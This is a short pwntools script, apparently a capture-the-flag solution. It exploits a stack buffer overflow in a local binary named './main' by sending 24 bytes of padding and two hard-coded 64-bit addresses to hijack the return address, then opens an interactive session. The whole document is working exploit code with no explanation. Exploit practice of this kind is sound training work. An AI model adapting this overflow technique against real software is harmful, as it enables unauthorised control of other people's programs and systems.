from pwn import *


p=process("./main")

p.sendline(b"A"*24+p64(0x0000000000001282)+p64(0x0000000000401100))

p.interactive()
